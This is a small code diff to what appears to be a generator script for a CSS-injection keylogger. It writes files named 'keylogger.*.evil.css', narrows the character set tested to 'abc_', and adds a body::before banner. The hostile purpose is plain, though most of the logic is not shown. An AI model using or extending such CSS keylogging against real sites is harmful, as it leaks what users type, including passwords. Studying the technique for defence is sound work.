@@ -39,8 +39,9 @@ function genCSS(pairs, headCSS, prefix = "_") {
     fs.writeFileSync(`keylogger.${fileId}.evil.css`, outString);
 }
 
-const allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_";
-// const allChars = "1234567890_";
+let allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_";
+allChars = "1234567890_";
+allChars = "abc_";
 const staticHeadCSS = `
 body::before {
     content: "You loaded keylogger.${allChars}.evil.css!";
